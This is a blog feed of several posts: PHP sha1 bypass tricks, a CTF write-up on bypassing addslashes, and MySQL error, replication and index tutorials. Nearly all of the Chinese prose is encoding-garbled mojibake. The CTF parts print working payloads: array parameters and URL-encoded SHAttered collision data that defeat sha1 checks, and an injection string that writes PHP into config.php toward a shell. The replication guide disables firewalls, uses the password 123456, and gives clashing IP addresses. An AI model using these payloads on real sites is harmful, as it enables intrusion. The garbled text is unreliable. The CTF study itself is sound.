class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Invalid password.&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Login first!&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>å¯ä»¥ä½¿ç”¨æ•°ç»„æ¥ç»•è¿‡<br><img src="/img/php/sha1-1.jpg"><br>è¿™æ ·åœ¨ç¬¬ä¸€å¤„åˆ¤æ–­æ—¶ä¸¤æ•°ç»„ç¡®å®æ˜¯ä¸åŒçš„ï¼Œä½†åœ¨ç¬¬äºŒå¤„åˆ¤æ–­æ—¶ç”±äºsha1()å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ç±»å‹ï¼Œå°†æŠ¥é”™å¹¶è¿”å›NULLï¼Œif æ¡ä»¶æˆç«‹</p>
<h1 id="ä¾‹2"><a href="#ä¾‹2" class="headerlink" title="ä¾‹2"></a>ä¾‹2</h1><p>æ—¢åˆ¤æ–­äº†ä¸¤ä¸ªå€¼ä¸èƒ½ç›¸ç­‰ï¼Œåˆåˆ¤æ–­äº†æ˜¯å¦ä¸ºæ•°ç»„</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>] == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your password can not be your name!&#x27;</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) || <span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;There is no way you can sneak me, young man!&#x27;</span>);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;yes&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Invalid password.&#x27;</span>;<br>&#125;<span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Login first!&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>è¿™æ ·åªèƒ½æ‰¾ä¸¤ä¸ªsha1å€¼ç›¸ç­‰çš„<br>æ‰¾åˆ°googleæ”¾å‡ºä¸¤ä¸ªSHA1å€¼ç›¸åŒè€Œä¸ä¸€æ ·(SHA256çš„å€¼ä¸é€š)çš„pdfæ–‡ä»¶<br><a href="https://blog.csdn.net/caiqiiqi/article/details/68953730">å…·ä½“åˆ†æ</a><br><a href="https://shattered.it/static/shattered-1.pdf">shattered-1.pdf</a></p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><code class="hljs llvm"><span class="hljs-variable">%25</span>PDF<span class="hljs-number">-1.3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%25</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%E3</span><span class="hljs-variable">%CF</span><span class="hljs-variable">%D3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-number">1</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>obj<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>C<span class="hljs-variable">%3</span>C/Width<span class="hljs-variable">%202</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Height<span class="hljs-variable">%203</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Type<span class="hljs-variable">%204</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Subtype<span class="hljs-variable">%205</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Filter<span class="hljs-variable">%206</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/ColorSpace<span class="hljs-variable">%207</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Length<span class="hljs-variable">%208</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/BitsPerComponent<span class="hljs-variable">%208</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>Astream<span class="hljs-variable">%0</span>A<span class="hljs-variable">%FF</span><span class="hljs-variable">%D8</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%00</span><span class="hljs-variable">%24</span>SHA<span class="hljs-number">-1</span><span class="hljs-variable">%20</span>is<span class="hljs-variable">%20</span>dead<span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%85</span>/<span class="hljs-variable">%EC</span><span class="hljs-variable">%09</span><span class="hljs-variable">%239</span>u<span class="hljs-variable">%9</span>C<span class="hljs-number">9</span><span class="hljs-variable">%B1</span><span class="hljs-variable">%A1</span><span class="hljs-variable">%C6</span><span class="hljs-variable">%3</span>CL<span class="hljs-variable">%97</span><span class="hljs-variable">%E1</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%01</span><span class="hljs-variable">%7</span>FF<span class="hljs-variable">%DC</span><span class="hljs-variable">%93</span><span class="hljs-variable">%A6</span><span class="hljs-variable">%B6</span><span class="hljs-variable">%7</span>E<span class="hljs-variable">%01</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%02</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%AA</span><span class="hljs-variable">%1</span>D<span class="hljs-variable">%B2V</span><span class="hljs-variable">%0</span>BE<span class="hljs-variable">%CAg</span><span class="hljs-variable">%D6</span><span class="hljs-variable">%88</span><span class="hljs-variable">%C7</span><span class="hljs-variable">%F8K</span><span class="hljs-variable">%8</span>CLy<span class="hljs-variable">%1</span>F<span class="hljs-variable">%E0</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%3</span>D<span class="hljs-variable">%F6</span><span class="hljs-variable">%14</span><span class="hljs-variable">%F8m</span><span class="hljs-variable">%B1i</span><span class="hljs-variable">%09</span><span class="hljs-variable">%01</span><span class="hljs-variable">%C5kE</span><span class="hljs-variable">%C1S</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%FE</span><span class="hljs-variable">%DF</span><span class="hljs-variable">%B7</span><span class="hljs-variable">%608</span><span class="hljs-variable">%E9rr</span>/<span class="hljs-variable">%E7</span><span class="hljs-variable">%ADr</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%0</span>EI<span class="hljs-variable">%04</span><span class="hljs-variable">%E0F</span><span class="hljs-variable">%C20W</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%E9</span><span class="hljs-variable">%D4</span><span class="hljs-variable">%13</span><span class="hljs-variable">%98</span><span class="hljs-variable">%AB</span><span class="hljs-variable">%E1.</span><span class="hljs-variable">%F5</span><span class="hljs-variable">%BC</span><span class="hljs-variable">%94</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%E35B</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%80</span>-<span class="hljs-variable">%98</span><span class="hljs-variable">%B5</span><span class="hljs-variable">%D7</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%2</span>A<span class="hljs-number">3</span>.<span class="hljs-variable">%C3</span><span class="hljs-variable">%7</span>F<span class="hljs-variable">%AC5</span><span class="hljs-variable">%14</span><span class="hljs-variable">%E7M</span><span class="hljs-variable">%DC</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%2</span>C<span class="hljs-variable">%C1</span><span class="hljs-variable">%A8t</span><span class="hljs-variable">%CD</span><span class="hljs-variable">%0</span>Cx<span class="hljs-number">0</span>Z<span class="hljs-variable">%21</span>Vda<span class="hljs-number">0</span><span class="hljs-variable">%97</span><span class="hljs-variable">%89</span><span class="hljs-variable">%60</span>k<span class="hljs-variable">%D0</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%3</span>F<span class="hljs-variable">%98</span><span class="hljs-variable">%CD</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%04</span>F<span class="hljs-variable">%29</span><span class="hljs-variable">%A1</span><br></code></pre></td></tr></table></figure>
<p><a href="https://shattered.it/static/shattered-2.pdf">shattered-2.pdf</a></p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><code class="hljs llvm"><span class="hljs-variable">%25</span>PDF<span class="hljs-number">-1.3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%25</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%E3</span><span class="hljs-variable">%CF</span><span class="hljs-variable">%D3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-number">1</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>obj<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>C<span class="hljs-variable">%3</span>C/Width<span class="hljs-variable">%202</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Height<span class="hljs-variable">%203</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Type<span class="hljs-variable">%204</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Subtype<span class="hljs-variable">%205</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Filter<span class="hljs-variable">%206</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/ColorSpace<span class="hljs-variable">%207</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Length<span class="hljs-variable">%208</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/BitsPerComponent<span class="hljs-variable">%208</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>Astream<span class="hljs-variable">%0</span>A<span class="hljs-variable">%FF</span><span class="hljs-variable">%D8</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%00</span><span class="hljs-variable">%24</span>SHA<span class="hljs-number">-1</span><span class="hljs-variable">%20</span>is<span class="hljs-variable">%20</span>dead<span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%85</span>/<span class="hljs-variable">%EC</span><span class="hljs-variable">%09</span><span class="hljs-variable">%239</span>u<span class="hljs-variable">%9</span>C<span class="hljs-number">9</span><span class="hljs-variable">%B1</span><span class="hljs-variable">%A1</span><span class="hljs-variable">%C6</span><span class="hljs-variable">%3</span>CL<span class="hljs-variable">%97</span><span class="hljs-variable">%E1</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%01</span>sF<span class="hljs-variable">%DC</span><span class="hljs-variable">%91</span>f<span class="hljs-variable">%B6</span><span class="hljs-variable">%7</span>E<span class="hljs-variable">%11</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%02</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%B6</span><span class="hljs-variable">%21</span><span class="hljs-variable">%B2V</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%F9</span><span class="hljs-variable">%CAg</span><span class="hljs-variable">%CC</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%C7</span><span class="hljs-variable">%F8</span><span class="hljs-variable">%5</span>B<span class="hljs-variable">%A8Ly</span><span class="hljs-variable">%03</span><span class="hljs-variable">%0</span>C<span class="hljs-variable">%2</span>B<span class="hljs-variable">%3</span>D<span class="hljs-variable">%E2</span><span class="hljs-variable">%18</span><span class="hljs-variable">%F8m</span><span class="hljs-variable">%B3</span><span class="hljs-variable">%A9</span><span class="hljs-variable">%09</span><span class="hljs-variable">%01</span><span class="hljs-variable">%D5</span><span class="hljs-variable">%DFE</span><span class="hljs-variable">%C1O</span><span class="hljs-variable">%26</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%DF</span><span class="hljs-variable">%B3</span><span class="hljs-variable">%DC8</span><span class="hljs-variable">%E9j</span><span class="hljs-variable">%C2</span>/<span class="hljs-variable">%E7</span><span class="hljs-variable">%BDr</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%0</span>EE<span class="hljs-variable">%BC</span><span class="hljs-variable">%E0F</span><span class="hljs-variable">%D2</span><span class="hljs-variable">%3</span>CW<span class="hljs-variable">%0</span>F<span class="hljs-variable">%EB</span><span class="hljs-variable">%14</span><span class="hljs-variable">%13</span><span class="hljs-variable">%98</span><span class="hljs-variable">%BBU.</span><span class="hljs-variable">%F5</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%E31</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%807</span><span class="hljs-variable">%B8</span><span class="hljs-variable">%B5</span><span class="hljs-variable">%D7</span><span class="hljs-variable">%1</span>F<span class="hljs-variable">%0</span>E<span class="hljs-number">3</span>.<span class="hljs-variable">%DF</span><span class="hljs-variable">%93</span><span class="hljs-variable">%AC5</span><span class="hljs-variable">%00</span><span class="hljs-variable">%EBM</span><span class="hljs-variable">%DC</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%EC</span><span class="hljs-variable">%C1</span><span class="hljs-variable">%A8dy</span><span class="hljs-variable">%0</span>Cx<span class="hljs-variable">%2</span>Cv<span class="hljs-variable">%21</span>V<span class="hljs-variable">%60</span><span class="hljs-variable">%DD0</span><span class="hljs-variable">%97</span><span class="hljs-variable">%91</span><span class="hljs-variable">%D0k</span><span class="hljs-variable">%D0</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%3</span>F<span class="hljs-variable">%98</span><span class="hljs-variable">%CD</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%BCF</span><span class="hljs-variable">%29</span><span class="hljs-variable">%B1</span><br></code></pre></td></tr></table></figure>
<p>æ»¡è¶³æ‰€æœ‰æ¡ä»¶<br><img src="/img/php/sha1-2.jpg"></p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>sha1</tag>
      </tags>
  </entry>
  <entry>
    <title>mysqlå¸¸è§é”™è¯¯è§£å†³æ–¹æ¡ˆåˆé›†</title>
    <url>/posts/88257c66/</url>
    <content><![CDATA[<h1 id="æ™®é€šç”¨æˆ·æ— æ³•ç™»å½•mysql"><a href="#æ™®é€šç”¨æˆ·æ— æ³•ç™»å½•mysql" class="headerlink" title="æ™®é€šç”¨æˆ·æ— æ³•ç™»å½•mysql"></a>æ™®é€šç”¨æˆ·æ— æ³•ç™»å½•mysql</h1><p>é”™è¯¯æè¿°ï¼š</p>
<blockquote>
<p>ERROR 1045 (28000): Access denied for user â€˜user01â€˜@â€™localhostâ€™ (using password: YES)</p>
</blockquote>
<p>è§£å†³æ–¹æ¡ˆï¼š<br>åœ¨<code>mysql.user</code>ä¸­å­˜åœ¨ç©ºç”¨æˆ·åè´¦æˆ·ï¼Œåˆ é™¤å³å¯</p>
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>åŸºç¡€</tag>
        <tag>mysql</tag>
        <tag>æ•°æ®åº“</tag>
      </tags>
  </entry>
  <entry>
    <title>mysqlä»å…¥é—¨åˆ°å…¥åœŸï¼ˆå…­ï¼‰</title>
    <url>/posts/8461dbd1/</url>
    <content><![CDATA[<h1 id="ä¸»ä»å¤‡ä»½"><a href="#ä¸»ä»å¤‡ä»½" class="headerlink" title="ä¸»ä»å¤‡ä»½"></a>ä¸»ä»å¤‡ä»½</h1><h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p>ä¸»æ•°æ®åº“ï¼š10.10.10.1   db1<br>ä»æ•°æ®åº“ï¼š10.10.10.2   db2</p>
<p>mariadbç‰ˆæœ¬è¶Šé«˜è¶Šå¥½</p>
<p>å…³é—­firewalldå’Œselinuxæˆ–è€…å¼€å¯å¯¹åº”è§„åˆ™</p>
<h2 id="æ›´æ”¹å¯†ç å’Œè®¾ç½®æƒé™"><a href="#æ›´æ”¹å¯†ç å’Œè®¾ç½®æƒé™" class="headerlink" title="æ›´æ”¹å¯†ç å’Œè®¾ç½®æƒé™"></a>æ›´æ”¹å¯†ç å’Œè®¾ç½®æƒé™</h2><p><code>mysql_secure_installation</code></p>
<p>disallow root login remotelyéœ€è¦é€‰nï¼Œå…¶ä»–y<br><img src="/img/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql6-1.jpg"></p>
<h2 id="ç¼–è¾‘é…ç½®æ–‡ä»¶"><a href="#ç¼–è¾‘é…ç½®æ–‡ä»¶" class="headerlink" title="ç¼–è¾‘é…ç½®æ–‡ä»¶"></a>ç¼–è¾‘é…ç½®æ–‡ä»¶</h2><p><code>vim /etc/my.cnf.d/server.cnf</code></p>
<p>åœ¨mysqldä¸‹å†™å…¥å¦‚ä¸‹è®¾ç½®</p>
<p>db1ä¸­</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[mysqld]</span><br><span class="hljs-attr">log_bin</span> = mysql-bin  //[å¿…é¡»]å¯ç”¨äºŒè¿›åˆ¶æ—¥å¿—<br><span class="hljs-attr">server_id</span> = <span class="hljs-number">1</span>        //[å¿…é¡»]æœåŠ¡å™¨å”¯ä¸€IDï¼Œé»˜è®¤æ˜¯<span class="hljs-number">1</span>ï¼Œä¸€èˆ¬å–IPæœ€åä¸€æ®µ<br></code></pre></td></tr></table></figure>

<p>db2ä¸­</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[mysqld]</span><br><span class="hljs-attr">log_bin</span> = mysql-bin<br><span class="hljs-attr">server_id</span> = <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>

<h2 id="åœ¨db1ä¸Šæˆæƒ"><a href="#åœ¨db1ä¸Šæˆæƒ" class="headerlink" title="åœ¨db1ä¸Šæˆæƒ"></a>åœ¨db1ä¸Šæˆæƒ</h2><p><code>grant replication slave on *.* to &#39;user&#39;@&#39;192.168.1.2&#39; identified by &quot;123456&quot;;</code></p>
<p><img src="/img/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql6-2.jpg"></p>
<h2 id="åœ¨db2ä¸ŠåŒ¹é…ç”¨æˆ·ä¿¡æ¯å¹¶å¯ç”¨è¿›ç¨‹"><a href="#åœ¨db2ä¸ŠåŒ¹é…ç”¨æˆ·ä¿¡æ¯å¹¶å¯ç”¨è¿›ç¨‹" class="headerlink" title="åœ¨db2ä¸ŠåŒ¹é…ç”¨æˆ·ä¿¡æ¯å¹¶å¯ç”¨è¿›ç¨‹"></a>åœ¨db2ä¸ŠåŒ¹é…ç”¨æˆ·ä¿¡æ¯å¹¶å¯ç”¨è¿›ç¨‹</h2><p><code>change master to master_host=&quot;192.168.1.1&quot;,master_user=&quot;user&quot;,master_password=&quot;123456&quot;;</code></p>
<p><code>start slave</code></p>
<p><img src="/img/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql6-3.jpg"></p>
<h2 id="æŸ¥çœ‹çŠ¶æ€"><a href="#æŸ¥çœ‹çŠ¶æ€" class="headerlink" title="æŸ¥çœ‹çŠ¶æ€"></a>æŸ¥çœ‹çŠ¶æ€</h2><p><code>show  slave  status\G;</code></p>
<p><img src="/img/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql6-4.jpg"></p>
<p>æ³¨ï¼šslave_io_runningåŠslave_sql_runningè¿›ç¨‹å¿…é¡»æ­£å¸¸è¿è¡Œï¼Œå³YESçŠ¶æ€ï¼Œå¦åˆ™éƒ½æ˜¯é”™è¯¯çš„çŠ¶æ€ã€‚</p>
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>åŸºç¡€</tag>
        <tag>mysql</tag>
        <tag>æ•°æ®åº“</tag>
      </tags>
  </entry>
  <entry>
    <title>mysqlä»å…¥é—¨åˆ°å…¥åœŸï¼ˆäº”ï¼‰</title>
    <url>/posts/e16f9008/</url>
    <content><![CDATA[<h1 id="ç´¢å¼•"><a href="#ç´¢å¼•" class="headerlink" title="ç´¢å¼•"></a>ç´¢å¼•</h1><blockquote>
<p>ç´¢å¼•æ˜¯ä¸€ç§ç‰¹æ®Šçš„æ•°æ®åº“ç»“æ„ï¼Œç”±æ•°æ®è¡¨ä¸­çš„ä¸€åˆ—æˆ–å¤šåˆ—ç»„åˆè€Œæˆï¼Œå¯ä»¥ç”¨æ¥å¿«é€ŸæŸ¥è¯¢æ•°æ®è¡¨ä¸­æœ‰æŸä¸€ç‰¹å®šå€¼çš„è®°å½•ã€‚</p>
</blockquote>
<blockquote>
<p>ä½¿ç”¨ç´¢å¼•å¯ä»¥å¾ˆå¤§ç¨‹åº¦ä¸Šæé«˜æ•°æ®åº“çš„æŸ¥è¯¢é€Ÿåº¦ï¼Œè¿˜æœ‰æ•ˆçš„æé«˜äº†æ•°æ®åº“ç³»ç»Ÿçš„æ€§èƒ½ã€‚</p>
</blockquote>
<h2 id="åˆ›å»ºç´¢å¼•"><a href="#åˆ›å»ºç´¢å¼•" class="headerlink" title="åˆ›å»ºç´¢å¼•"></a>åˆ›å»ºç´¢å¼•</h2><p>æ–¹æ³•ä¸€ï¼š<br><code>create index &lt;ç´¢å¼•å&gt; on &lt;è¡¨å&gt; (&lt;åˆ—å&gt; [&lt;é•¿åº¦&gt;] [ ASC | DESC])</code></p>
<p>1: åœ¨ä¸€ä¸ªå·²æœ‰çš„è¡¨ä¸Šåˆ›å»ºç´¢å¼•ï¼Œä½†æ˜¯è¿™ä¸ªè¯­å¥ä¸èƒ½åˆ›å»ºä¸»é”®<br>2: ä¸€ä¸ªè¡¨å¯ä»¥åˆ›å»ºå¤šä¸ªç´¢å¼•ï¼Œä½†æ¯ä¸ªç´¢å¼•åœ¨è¯¥è¡¨ä¸­çš„åç§°æ˜¯å”¯ä¸€çš„<br>3: åˆ—åå’Œé•¿åº¦æ˜¯å¯é€‰é¡¹<br>4: ascæŒ‡å®šç´¢å¼•æŒ‰ç…§å‡åºæ¥æ’åˆ—ï¼ŒdescæŒ‡å®šç´¢å¼•æŒ‰ç…§é™åºæ¥æ’åˆ—ï¼Œé»˜è®¤ä¸ºASC</p>
<p><img src="/img/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql5-1.png"></p>
<p>æ–¹æ³•äºŒï¼š<br>åˆ›å»ºè¡¨çš„æ—¶å€™åŒæ—¶åˆ›å»ºç´¢å¼•</p>
<p>æ–¹æ³•ä¸‰ï¼š<br><code>alter table &lt;name&gt; add [UNIQUE | FULLTEXT] [INDEX] ç´¢å¼•å(åˆ—å)</code></p>
<p>ä¸<code>create index</code>è¯­å¥å·®ä¸å¤š<br><code>unique|fulltext</code>ä¸ºå¯é€‰å‚æ•°ï¼Œåˆ†åˆ«è¡¨ç¤ºå”¯ä¸€ç´¢å¼•ã€å…¨æ–‡ç´¢å¼•</p>
<p><img src="/img/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql5-2.png"></p>
<h2 id="åˆ é™¤ç´¢å¼•"><a href="#åˆ é™¤ç´¢å¼•" class="headerlink" title="åˆ é™¤ç´¢å¼•"></a>åˆ é™¤ç´¢å¼•</h2><p>æ–¹æ³•ä¸€ï¼š<br><code>drop index &lt;ç´¢å¼•å&gt; on &lt;è¡¨å&gt;</code></p>
<p>æ–¹æ³•äºŒï¼š<br><code>alter table &lt;è¡¨å&gt; drop index &lt;ç´¢å¼•å&gt;</code></p>
<h2 id="æŸ¥çœ‹ç´¢å¼•"><a href="#æŸ¥çœ‹ç´¢å¼•" class="headerlink" title="æŸ¥çœ‹ç´¢å¼•"></a>æŸ¥çœ‹ç´¢å¼•</h2><p><code>show index from &lt;è¡¨å&gt; [ from &lt;æ•°æ®åº“å&gt;]</code></p>
<p><img src="/img/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql5-3.png"></p>
<p><img src="/img/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql5-4.png"></p>
<h1 id="å¸¸ç”¨è¿ç®—ç¬¦"><a href="#å¸¸ç”¨è¿ç®—ç¬¦" class="headerlink" title="å¸¸ç”¨è¿ç®—ç¬¦"></a>å¸¸ç”¨è¿ç®—ç¬¦</h1><h2 id="ç®—æœ¯è¿ç®—ç¬¦"><a href="#ç®—æœ¯è¿ç®—ç¬¦" class="headerlink" title="ç®—æœ¯è¿ç®—ç¬¦"></a>ç®—æœ¯è¿ç®—ç¬¦</h2><p><img src="/img/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql5-5.png"></p>
<h2 id="é€»è¾‘è¿ç®—ç¬¦"><a href="#é€»è¾‘è¿ç®—ç¬¦" class="headerlink" title="é€»è¾‘è¿ç®—ç¬¦"></a>é€»è¾‘è¿ç®—ç¬¦</h2><p><img src="/img/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql5-6.png"></p>
<h2 id="æ¯”è¾ƒè¿ç®—ç¬¦"><a href="#æ¯”è¾ƒè¿ç®—ç¬¦" class="headerlink" title="æ¯”è¾ƒè¿ç®—ç¬¦"></a>æ¯”è¾ƒè¿ç®—ç¬¦</h2><p><img src="/img/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql5-7.png"></p>
<h2 id="ä½è¿ç®—ç¬¦"><a href="#ä½è¿ç®—ç¬¦" class="headerlink" title="ä½è¿ç®—ç¬¦"></a>ä½è¿ç®—ç¬¦</h2><p><img src="/img/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql5-8.png"></p>
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>åŸºç¡€</tag>
        <tag>mysql</tag>
        <tag>æ•°æ®åº“</tag>
      </tags>
  </entry>
  <entry>
    <title>ã€ctfshowã€‘webå…¥é—¨-å¤§èµ›åŸé¢˜</title>
    <url>/posts/bb1e6cfa/</url>
    <content><![CDATA[<p>åšä¸€é¢˜æ›´æ–°ä¸€é¢˜å§</p>
<h1 id="WEB692"><a href="#WEB692" class="headerlink" title="WEB692"></a>WEB692</h1><p>ç»•è¿‡addslasheså¹¶å†™å…¥æ–‡ä»¶é…ç½®getshell<br>é¢˜ç›®ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;option&#x27;</span>])) <span class="hljs-keyword">die</span>();<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;option&#x27;</span>]);<br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;./config.php&#x27;</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;|\$option=\&#x27;.*\&#x27;;|&#x27;</span>, <span class="hljs-string">&quot;\$option=&#x27;<span class="hljs-subst">$str</span>&#x27;;&quot;</span>, <span class="hljs-variable">$file</span>);<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;./config.php&#x27;</span>, <span class="hljs-variable">$file</span>);<br></code></pre></td></tr></table></figure>

<p>é¦–å…ˆçœ‹ä¸€ä¸‹addslashes() å‡½æ•°çš„ä½œç”¨ï¼š<br>addslashes() å‡½æ•°ä¼šå°†é¢„å®šä¹‰çš„å­—ç¬¦å‰æ·»åŠ åæ–œæ å­—ç¬¦ä¸²<br>é¢„å®šä¹‰å­—ç¬¦æœ‰<code>å•å¼•å·ï¼ŒåŒå¼•å·ï¼Œåæ–œæ ï¼ŒNULL</code>å››ä¸ª<br>æ•ˆæœå¦‚å›¾ï¼Œä¼šæ·»åŠ ä¸Š<code>\</code><br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/addslashes.png"></p>
<p>æ‰€ä»¥å½“æˆ‘ä»¬ä¼ å…¥<code>?option=a\&#39;;phpinfo();//</code>æ—¶<br>ä¼šå˜ä¸º<code>a\\\&#39;;phpinfo();//</code></p>
